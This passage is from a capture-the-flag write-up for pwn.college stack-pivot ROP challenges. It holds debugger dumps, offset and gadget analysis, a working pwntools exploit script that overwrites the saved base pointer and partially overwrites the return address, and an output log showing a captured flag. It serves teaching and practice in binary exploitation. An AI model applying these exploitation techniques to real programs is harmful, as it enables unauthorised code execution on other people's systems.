   0x0000000000001e8e <+234>:   nop
   0x0000000000001e8f <+235>:   leave
   0x0000000000001e90 <+236>:   ret
End of assembler dump.
```

Let us set a breakpoint at `challenge+214` where the call to `read()` is made.

```
pwndbg> break *(challenge+214)
Breakpoint 1 at 0x1e7a
```

```
pwndbg> run
Starting program: /challenge/pivotal-pointer-hard 
###
### Welcome to /challenge/pivotal-pointer-hard!
###

[LEAK] Your input buffer is located at: 0x7ffe74b2f618.


Breakpoint 1, 0x000060730e465e7a in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────
 RAX  0x7ffe74b2f618 ◂— 0
 RBX  0x60730e465f50 (__libc_csu_init) ◂— endbr64 
 RCX  0x7060b4ecdbcb (mprotect+11) ◂— cmp rax, -0xfff
 RDX  0x1000
 RDI  0
 RSI  0x7ffe74b2f618 ◂— 0
 R8   8
 R9   0x7060b4fe3020 ◂— xor qword ptr [rsp], rax
 R10  0x22
 R11  0x287
 R12  0x60730e465160 (_start) ◂— endbr64 
 R13  0x7ffe74b2f790 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe74b2f670 —▸ 0x7ffe74b2f6a0 ◂— 0
 RSP  0x7ffe74b2f5f0 —▸ 0x7060b4f9e4a0 (_IO_file_jumps) ◂— 0
 RIP  0x60730e465e7a (challenge+214) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────
 ► 0x60730e465e7a <challenge+214>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/1)
        buf: 0x7ffe74b2f618 ◂— 0
        nbytes: 0x1000
 
   0x60730e465e7f <challenge+219>    mov    dword ptr [rbp - 4], eax
   0x60730e465e82 <challenge+222>    lea    rdi, [rip + 0x240]           RDI => 0x60730e4660c9 ◂— 'Leaving!'
   0x60730e465e89 <challenge+229>    call   puts@plt                    <puts@plt>
 
   0x60730e465e8e <challenge+234>    nop    
   0x60730e465e8f <challenge+235>    leave  
   0x60730e465e90 <challenge+236>    ret    
 
   0x60730e465e91 <main>             endbr64 
   0x60730e465e95 <main+4>           push   rbp
   0x60730e465e96 <main+5>           mov    rbp, rsp
   0x60730e465e99 <main+8>           sub    rsp, 0x20
─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffe74b2f5f0 —▸ 0x7060b4f9e4a0 (_IO_file_jumps) ◂— 0
01:0008│-078     0x7ffe74b2f5f8 —▸ 0x7ffe74b2f7a8 —▸ 0x7ffe74b30689 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-070     0x7ffe74b2f600 —▸ 0x7ffe74b2f798 —▸ 0x7ffe74b30669 ◂— '/challenge/pivotal-pointer-hard'
03:0018│-068     0x7ffe74b2f608 ◂— 0x1b4e475dd
04:0020│-060     0x7ffe74b2f610 —▸ 0x7060b4fe3000 ◂— push rbp
05:0028│ rax rsi 0x7ffe74b2f618 ◂— 0
... ↓            2 skipped
───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x60730e465e7a challenge+214
   1   0x60730e465f36 main+165
   2   0x7060b4dd9083 __libc_start_main+243
   3   0x60730e46518e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
   - Location of the buffer: `0x7ffe74b2f618`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

Let's get the location of the stored return pointer, and calculate the offset.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffe74b2f680:
 rip = 0x60730e465e7a in challenge; saved rip = 0x60730e465f36
 called by frame at 0x7ffe74b2f6b0
 Arglist at 0x7ffe74b2f670, args: 
 Locals at 0x7ffe74b2f670, Previous frame's sp is 0x7ffe74b2f680
 Saved registers:
  rbp at 0x7ffe74b2f670, rip at 0x7ffe74b2f678
```

```
pwndbg> p/d 0x7ffe74b2f678 - 0x7ffe74b2f618
$1 = 96
```

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `96`
   - Location of the buffer: `0x7ffe74b2f618`
   - Location of the stored return pointer to `main()`: `0x7ffe74b2f678`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

#### ROP gadgets

The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different safe the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.

We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.

We know that the `leave ; ret` instructions are at the epilogue of every function. We also know where this gadget is in the `challenge()` function:

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x000060730e465e8f <+235>:   leave
   0x000060730e465e90 <+236>:   ret
End of assembler dump.
```

Let's find the address of the same gadget in `main()`.

```
pwndbg> disassemble main
Dump of assembler code for function main:

# ---- snip ----

   0x000060730e465f47 <+182>:   leave
   0x000060730e465f48 <+183>:   ret
End of assembler dump.
```

Finally, since we want to overwrite the stored return pointer, let's check it's value as well.

```
pwndbg> x/gx 0x7ffe74b2f678
0x7ffe74b2f678: 0x000060730e465f36
```

We can see that the address of the `leave ; ret gadget` in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x5f\x47` vs `\x5f\x36`). Where the address of the gadget in `challenge()` only differs in the four least significant nibbles as compared to the value of the stored return pointer (`\x5e\x8f` vs `\x5f\x36`).

So, if we use the `leave ; ret` gadget present in `main()` we will only have to overwrite the two least significant nibbles, which we can do deterministically.

This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).

We have the following information now:

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `96`
   - Location of the buffer: `0x7ffe74b2f618`
   - Location of the stored return pointer to `main()`: `0x7ffe74b2f678`
- [x] Locations of required ROP gadgets
   - `leave ; ret`: `\x47`
- [ ] Offset of the overwritten stored base pointer value from the buffer

Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`. We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16.

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `96`
   - Location of the buffer: `0x7ffe74b2f618`
   - Location of the stored return pointer to `main()`: `0x7ffe74b2f678`
- [x] Locations of required ROP gadgets
   - `leave ; ret`: `\x47`
- [x] Offset of the overwritten stored base pointer value from the buffer: `-16`

### ROP chain: Stack pivot + ret2win

The ROP chain would be the exact same as the [easy challenge](#rop-chain-stack-pivot--ret2win).

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *
context.arch = 'amd64'

# ROP gadgets
leave_lsb = b"\x47"
# Memory addresses and offsets
rip_offset = 96
rbp_offset = rip_offset - 8

p = process('/challenge/pivotal-pointer-hard')

# Parse leaks
p.recvuntil(b"buffer is located at: ")
buffer_addr = int(p.recvline().strip().decode().replace('.', ''), 16)

# Pivot logic
# win_ptr is at leak-8. 
# Target RBP at leak-16 makes RSP land on win_ptr after 'pop rbp'.
target_rbp = buffer_addr - 16

# Stable 1-byte pivot payload
payload = flat(
    b"A" * rbp_offset,
    target_rbp,
    leave_lsb
)

p.send(payload)
p.interactive()
```

```
hacker@return-oriented-programming~pivotal-pointer-hard:/$ python ~/script.py
[+] Starting local process '/challenge/pivotal-pointer-hard': pid 5806
[*] Switching to interactive mode

[*] Process '/challenge/pivotal-pointer-hard' stopped with exit code -11 (SIGSEGV) (pid 5806)
Leaving!
pwn.college{0Pr7BiLMtjcoBctPGgEXjVW3FuP.0FM2MDL4ITM0EzW}
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Pivotal Payload (Easy)

```
hacker@return-oriented-programming~pivotal-payload-hard:~$ /challenge/pivotal-payload-hard 
###
### Welcome to /challenge/pivotal-payload-hard!
###

[LEAK] Your input buffer is located at: 0x7ffc03da76f8.

```

Since location of the pointer to `win()` is before our buffer, we will have to perform a stack pivot so that our ROP chain executes the `win()` function.

We need the following:
- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

### Binary Analysis

#### `challenge()`


```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x0000000000002033 <+547>:   lea    rdi,[rip+0x115e]        # 0x3198
   0x000000000000203a <+554>:   call   0x1160 <puts@plt>
   0x000000000000203f <+559>:   lea    rdi,[rip+0x11ca]        # 0x3210
   0x0000000000002046 <+566>:   call   0x1160 <puts@plt>
   0x000000000000204b <+571>:   lea    rdx,[rbp-0x80]
   0x000000000000204f <+575>:   mov    eax,0x0
   0x0000000000002054 <+580>:   mov    ecx,0xe
   0x0000000000002059 <+585>:   mov    rdi,rdx
   0x000000000000205c <+588>:   rep stos QWORD PTR es:[rdi],rax
   0x000000000000205f <+591>:   mov    rax,rsp
   0x0000000000002062 <+594>:   mov    QWORD PTR [rip+0x2ff7],rax        # 0x5060 <sp_>
   0x0000000000002069 <+601>:   mov    rax,rbp
   0x000000000000206c <+604>:   mov    QWORD PTR [rip+0x2fcd],rax        # 0x5040 <bp_>
   0x0000000000002073 <+611>:   mov    rdx,QWORD PTR [rip+0x2fc6]        # 0x5040 <bp_>
   0x000000000000207a <+618>:   mov    rax,QWORD PTR [rip+0x2fdf]        # 0x5060 <sp_>
   0x0000000000002081 <+625>:   sub    rdx,rax
   0x0000000000002084 <+628>:   mov    rax,rdx
   0x0000000000002087 <+631>:   shr    rax,0x3
   0x000000000000208b <+635>:   add    rax,0x2
   0x000000000000208f <+639>:   mov    QWORD PTR [rip+0x2fba],rax        # 0x5050 <sz_>
   0x0000000000002096 <+646>:   mov    rax,QWORD PTR [rip+0x2fa3]        # 0x5040 <bp_>
   0x000000000000209d <+653>:   add    rax,0x8
   0x00000000000020a1 <+657>:   mov    QWORD PTR [rip+0x2fb0],rax        # 0x5058 <rp_>
   0x00000000000020a8 <+664>:   lea    rdi,[rip+0x11c9]        # 0x3278
   0x00000000000020af <+671>:   call   0x1160 <puts@plt>
   0x00000000000020b4 <+676>:   lea    rdi,[rip+0x123d]        # 0x32f8
   0x00000000000020bb <+683>:   call   0x1160 <puts@plt>
   0x00000000000020c0 <+688>:   lea    rdi,[rip+0x12a9]        # 0x3370
   0x00000000000020c7 <+695>:   call   0x1160 <puts@plt>
   0x00000000000020cc <+700>:   lea    rdi,[rip+0x1315]        # 0x33e8
   0x00000000000020d3 <+707>:   call   0x1160 <puts@plt>
   0x00000000000020d8 <+712>:   lea    rdi,[rip+0x1381]        # 0x3460
   0x00000000000020df <+719>:   call   0x1160 <puts@plt>
   0x00000000000020e4 <+724>:   lea    rdi,[rip+0x13c5]        # 0x34b0
   0x00000000000020eb <+731>:   call   0x1160 <puts@plt>
   0x00000000000020f0 <+736>:   lea    rax,[rbp-0x80]
   0x00000000000020f4 <+740>:   mov    edx,0x8
   0x00000000000020f9 <+745>:   mov    rsi,rax
   0x00000000000020fc <+748>:   lea    rdi,[rip+0x13fd]        # 0x3500
   0x0000000000002103 <+755>:   mov    eax,0x0
   0x0000000000002108 <+760>:   call   0x1190 <printf@plt>
   0x000000000000210d <+765>:   lea    rdi,[rip+0x1434]        # 0x3548
   0x0000000000002114 <+772>:   call   0x1160 <puts@plt>
   0x0000000000002119 <+777>:   lea    rdi,[rip+0x1490]        # 0x35b0
   0x0000000000002120 <+784>:   call   0x1160 <puts@plt>
   0x0000000000002125 <+789>:   lea    rdi,[rip+0x14bc]        # 0x35e8
   0x000000000000212c <+796>:   call   0x1160 <puts@plt>
   0x0000000000002131 <+801>:   lea    rdi,[rip+0x14e0]        # 0x3618
   0x0000000000002138 <+808>:   call   0x1160 <puts@plt>
   0x000000000000213d <+813>:   lea    rdi,[rip+0x1514]        # 0x3658
   0x0000000000002144 <+820>:   call   0x1160 <puts@plt>
   0x0000000000002149 <+825>:   lea    rdi,[rip+0x1528]        # 0x3678
   0x0000000000002150 <+832>:   call   0x1160 <puts@plt>
   0x0000000000002155 <+837>:   lea    rdi,[rip+0x1554]        # 0x36b0
   0x000000000000215c <+844>:   call   0x1160 <puts@plt>
   0x0000000000002161 <+849>:   lea    rdi,[rip+0x1580]        # 0x36e8
   0x0000000000002168 <+856>:   call   0x1160 <puts@plt>
   0x000000000000216d <+861>:   lea    rax,[rbp-0x80]
   0x0000000000002171 <+865>:   add    rax,0x8
   0x0000000000002175 <+869>:   mov    rsi,rax
   0x0000000000002178 <+872>:   lea    rdi,[rip+0x15b1]        # 0x3730
   0x000000000000217f <+879>:   mov    eax,0x0
   0x0000000000002184 <+884>:   call   0x1190 <printf@plt>
   0x0000000000002189 <+889>:   mov    r9d,0x0
   0x000000000000218f <+895>:   mov    r8d,0x0
   0x0000000000002195 <+901>:   mov    ecx,0x22
   0x000000000000219a <+906>:   mov    edx,0x3
   0x000000000000219f <+911>:   mov    esi,0x138
   0x00000000000021a4 <+916>:   mov    edi,0x0
   0x00000000000021a9 <+921>:   call   0x1180 <mmap@plt>
   0x00000000000021ae <+926>:   mov    QWORD PTR [rbp-0x80],rax
   0x00000000000021b2 <+930>:   mov    rax,QWORD PTR [rbp-0x80]
   0x00000000000021b6 <+934>:   mov    edx,0x138
   0x00000000000021bb <+939>:   lea    rsi,[rip+0x159e]        # 0x3760
   0x00000000000021c2 <+946>:   mov    rdi,rax
   0x00000000000021c5 <+949>:   call   0x11d0 <memcpy@plt>
   0x00000000000021ca <+954>:   mov    rax,QWORD PTR [rbp-0x80]
   0x00000000000021ce <+958>:   mov    edx,0x5
   0x00000000000021d3 <+963>:   mov    esi,0x138
   0x00000000000021d8 <+968>:   mov    rdi,rax
   0x00000000000021db <+971>:   call   0x1220 <mprotect@plt>
   0x00000000000021e0 <+976>:   test   eax,eax
   0x00000000000021e2 <+978>:   je     0x2203 <challenge+1011>
   0x00000000000021e4 <+980>:   lea    rcx,[rip+0x175d]        # 0x3948 <__PRETTY_FUNCTION__.23120>
   0x00000000000021eb <+987>:   mov    edx,0xa1
   0x00000000000021f0 <+992>:   lea    rsi,[rip+0x15b8]        # 0x37af
   0x00000000000021f7 <+999>:   lea    rdi,[rip+0x15ba]        # 0x37b8
   0x00000000000021fe <+1006>:  call   0x11a0 <__assert_fail@plt>
   0x0000000000002203 <+1011>:  mov    rax,QWORD PTR [rbp-0x80]
   0x0000000000002207 <+1015>:  mov    rsi,rax
   0x000000000000220a <+1018>:  lea    rdi,[rip+0x15e7]        # 0x37f8
   0x0000000000002211 <+1025>:  mov    eax,0x0
   0x0000000000002216 <+1030>:  call   0x1190 <printf@plt>
   0x000000000000221b <+1035>:  lea    rax,[rbp-0x80]
   0x000000000000221f <+1039>:  add    rax,0x8
   0x0000000000002223 <+1043>:  mov    edx,0x1000
   0x0000000000002228 <+1048>:  mov    rsi,rax
   0x000000000000222b <+1051>:  mov    edi,0x0
   0x0000000000002230 <+1056>:  call   0x11b0 <read@plt>
   0x0000000000002235 <+1061>:  mov    DWORD PTR [rbp-0x4],eax
   0x0000000000002238 <+1064>:  mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000223b <+1067>:  cdqe
   0x000000000000223d <+1069>:  lea    rdx,[rbp-0x80]
   0x0000000000002241 <+1073>:  lea    rcx,[rdx+0x8]
   0x0000000000002245 <+1077>:  mov    rdx,QWORD PTR [rip+0x2e0c]        # 0x5058 <rp_>
   0x000000000000224c <+1084>:  sub    rcx,rdx
   0x000000000000224f <+1087>:  mov    rdx,rcx
   0x0000000000002252 <+1090>:  add    rax,rdx
   0x0000000000002255 <+1093>:  shr    rax,0x3
   0x0000000000002259 <+1097>:  mov    rdx,rax
   0x000000000000225c <+1100>:  mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000225f <+1103>:  mov    esi,eax
   0x0000000000002261 <+1105>:  lea    rdi,[rip+0x15d0]        # 0x3838
   0x0000000000002268 <+1112>:  mov    eax,0x0
   0x000000000000226d <+1117>:  call   0x1190 <printf@plt>
   0x0000000000002272 <+1122>:  lea    rdi,[rip+0x15f7]        # 0x3870
   0x0000000000002279 <+1129>:  call   0x1160 <puts@plt>
   0x000000000000227e <+1134>:  lea    rdi,[rip+0x1653]        # 0x38d8
   0x0000000000002285 <+1141>:  call   0x1160 <puts@plt>
   0x000000000000228a <+1146>:  mov    eax,DWORD PTR [rbp-0x4]
   0x000000000000228d <+1149>:  cdqe
   0x000000000000228f <+1151>:  lea    rdx,[rbp-0x80]
   0x0000000000002293 <+1155>:  lea    rcx,[rdx+0x8]
   0x0000000000002297 <+1159>:  mov    rdx,QWORD PTR [rip+0x2dba]        # 0x5058 <rp_>
   0x000000000000229e <+1166>:  sub    rcx,rdx
   0x00000000000022a1 <+1169>:  mov    rdx,rcx
   0x00000000000022a4 <+1172>:  add    rax,rdx
   0x00000000000022a7 <+1175>:  shr    rax,0x3
   0x00000000000022ab <+1179>:  add    eax,0x1
   0x00000000000022ae <+1182>:  mov    edx,eax
   0x00000000000022b0 <+1184>:  mov    rax,QWORD PTR [rip+0x2da1]        # 0x5058 <rp_>
   0x00000000000022b7 <+1191>:  mov    esi,edx
   0x00000000000022b9 <+1193>:  mov    rdi,rax
   0x00000000000022bc <+1196>:  call   0x1720 <print_chain>
   0x00000000000022c1 <+1201>:  lea    rdi,[rip+0x1652]        # 0x391a
   0x00000000000022c8 <+1208>:  call   0x1160 <puts@plt>
 
# ---- snip ----

   0x00000000000024ce <+1726>:  leave
   0x00000000000024cf <+1727>:  ret
End of assembler dump.
```

Let us set a breakpoint at `challenge+1056` where the call to `read()` is made.

```
pwndbg> break *(challenge+1056)
Breakpoint 1 at 0x2230
```

```
pwndbg> run
Starting program: /challenge/pivotal-payload-easy 
###
### Welcome to /challenge/pivotal-payload-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a
partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes
to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to
ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This
might take anywhere from 0-12 bits of bruteforce depending on the scenario.

In this challenge, a pointer to the win function is stored on the stack.
That pointer is stored at 0x7ffe4e08de00, 8 bytes before your input buffer.
If you can pivot the stack to make the next gadget run be that win function, you will get the flag!

ASLR means that the address of the stack is not known,
but I will simulate a memory disclosure of it.
By knowing where the stack is, you can now reference data
that you write onto the stack.
Be careful: this data could trip up your ROP chain,
because it could be interpreted as return addresses.
You can use gadgets that shift the stack appropriately to avoid that.
[LEAK] Your input buffer is located at: 0x7ffe4e08de08.

The win function has just been dynamically constructed at 0x7ac48f542000.

Breakpoint 1, 0x00005f25abcb9230 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────
 RAX  0x7ffe4e08de08 ◂— 0
 RBX  0x5f25abcb9590 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffe4e08de08 ◂— 0
 R8   0x4a
 R9   0x4a
 R10  0x5f25abcba834 ◂— 0x6563655200000a2e /* '.\n' */
 R11  0x246
 R12  0x5f25abcb8240 (_start) ◂— endbr64 
 R13  0x7ffe4e08dfa0 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffe4e08de80 —▸ 0x7ffe4e08deb0 ◂— 0
 RSP  0x7ffe4e08dde0 ◂— 1
 RIP  0x5f25abcb9230 (challenge+1056) ◂— call read@plt
──────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────
 ► 0x5f25abcb9230 <challenge+1056>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffe4e08de08 ◂— 0
        nbytes: 0x1000
 
   0x5f25abcb9235 <challenge+1061>    mov    dword ptr [rbp - 4], eax
   0x5f25abcb9238 <challenge+1064>    mov    eax, dword ptr [rbp - 4]
   0x5f25abcb923b <challenge+1067>    cdqe   
   0x5f25abcb923d <challenge+1069>    lea    rdx, [rbp - 0x80]
   0x5f25abcb9241 <challenge+1073>    lea    rcx, [rdx + 8]
   0x5f25abcb9245 <challenge+1077>    mov    rdx, qword ptr [rip + 0x2e0c]     RDX, [rp_]
   0x5f25abcb924c <challenge+1084>    sub    rcx, rdx
   0x5f25abcb924f <challenge+1087>    mov    rdx, rcx
   0x5f25abcb9252 <challenge+1090>    add    rax, rdx
   0x5f25abcb9255 <challenge+1093>    shr    rax, 3
────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffe4e08dde0 ◂— 1
01:0008│-098     0x7ffe4e08dde8 —▸ 0x7ffe4e08dfb8 —▸ 0x7ffe4e08f67e ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-090     0x7ffe4e08ddf0 —▸ 0x7ffe4e08dfa8 —▸ 0x7ffe4e08f65e ◂— '/challenge/pivotal-payload-easy'
03:0018│-088     0x7ffe4e08ddf8 ◂— 0x18e372951
04:0020│-080     0x7ffe4e08de00 —▸ 0x7ac48f542000 ◂— push rbp
05:0028│ rax rsi 0x7ffe4e08de08 ◂— 0
... ↓            2 skipped
──────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5f25abcb9230 challenge+1056
   1   0x5f25abcb9575 main+165
   2   0x7ac48e306083 __libc_start_main+243
   3   0x5f25abcb826e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between the location of the buffer and the location of the stored return pointer to `main()`
   - Location of the buffer: `0x7ffe4e08de08`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

Let's get the location of the stored return pointer, and calculate the offset.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffe4e08de90:
 rip = 0x5f25abcb9230 in challenge; saved rip = 0x5f25abcb9575
 called by frame at 0x7ffe4e08dec0
 Arglist at 0x7ffe4e08de80, args: 
 Locals at 0x7ffe4e08de80, Previous frame's sp is 0x7ffe4e08de90
 Saved registers:
  rbp at 0x7ffe4e08de80, rip at 0x7ffe4e08de88
```

```
pwndbg> p/d 0x7ffe4e08de88 - 0x7ffe4e08de08
$1 = 128
```

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `128`
   - Location of the buffer: `0x7ffe4e08de08`
   - Location of stored return pointer to `main()`: `0x7ffe4e08de88`
- [ ] Locations of required ROP gadgets
- [ ] Offset of the overwritten stored base pointer value from the buffer

#### ROP gadgets

The challenge has ASLR enabled, which means that the addresses of the ROP gadgets would be different safe the 3 least significant nibbles. If we decide to do partial overwrite, that will require brute forcing.

We are looking for a specific gadget `leave ; ret` which pops the value of `rbp` into `rsp`. So in our chain, if we replace the stored base pointer with the address somewhere above that of the pointer to `win()`, our stack pointer would be moved to that location above the pointer to `win()`. This would be our stack pivot.

We know that the `leave ; ret` instructions are at the epilogue of every function.
We also know where this gadget is in the `challenge()` function:

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x00005f25abcb94ce <+1726>:  leave
   0x00005f25abcb94cf <+1727>:  ret
End of assembler dump.
```

Let's find the address of the same gadget in `main()`.

```
pwndbg> disassemble main
Dump of assembler code for function main:

# ---- snip ----

   0x00005f25abcb9586 <+182>:   leave
   0x00005f25abcb9587 <+183>:   ret
End of assembler dump.
```

Finally, since we want to overwrite the stored return pointer, let's check it's value as well.

```
pwndbg> x/gx 0x7ffe4e08de88
0x7ffe4e08de88: 0x00005f25abcb9575
```

We can see that the address of the `leave ; ret` gadget in `main()` only differs in the two least significant nibbles as compared to the value of the stored return pointer (`\x95\x86` vs `\x95\x75`).
Where the address of the gadget in `challenge()` only differs in the four least significant nibbles as compared to the value of the stored return pointer (`\x94\xce` vs `\x95\x75`).

So, if we use the `leave ; ret` gadget present in `main()` we will only have to overwrite the two least significant nibbles, which we can do deterministically. 

This is because the address are always `0x1000` aligned. So, if we went with the gadget in `challenge()` we would have to brute force the fourth least significant nibble. See [here](https://writeups.kunull.net/pwn-college/intro-to-cybersecurity/binary-exploitation#partial-return-address-overwrite).

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `128`
   - Location of the buffer: `0x7ffe4e08de08`
   - Location of stored return pointer to `main()`: `0x7ffe4e08de88`
- [x] LSB of required ROP gadgets:
   - `leave ; ret`: `\x86`
- [ ] Offset of the overwritten stored base pointer value from the buffer

Finally we also need to define the value with which we will overwrite the stored base pointer, because that will define what is popped in `rsp`.
We know the location of the buffer, so we can set the overwritten stored base pointer to that value minus 16. This will be clear when looking at the ROP chain.

- [x] Offset between the location of the buffer and the location of the stored return pointer to `main()`: `128`
   - Location of the buffer: `0x7ffe4e08de08`
   - Location of stored return pointer to `main()`: `0x7ffe4e08de88`
- [x] LSB of required ROP gadgets:
   - `leave ; ret`: `\x86`
- [x] Offset of the overwritten stored base pointer value from the buffer: `-16`

### ROP chain: Stack pivot + ret2win

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffe4e08ddf8 │  .. .. .. .. .. .. .. ..  │
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de00 │  00 00 7a c4 8f 54 20 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de78 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp --> 0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffe4e08de88 │  .. .. .. .. .. .. 95 86  │ --> ( leave ; ret within main() )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffe4e08ddf8 │  .. .. .. .. .. .. .. ..  │
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de00 │  00 00 7a c4 8f 54 20 00  │ --> ( win() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de08 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de78 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rbp --> 0x7ffe4e08de80 │  00 00 7f fe 4e 08 dd f8  │ 
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de88 │  .. .. .. .. .. .. 95 86  │ --> ( leave ; ret within main() )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffe4e08de88 │  .. .. .. .. .. .. .. ..  │ 
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> mov rsp, rbp ; pop rbp ; ret 
      \\ leave is the same as (mov rsp, rbp ; pop rbp)
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffe4e08ddf8 │  .. .. .. .. .. .. .. ..  │
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffe4e08de00 │  00 00 7a c4 8f 54 20 00  │ --> ( win() )
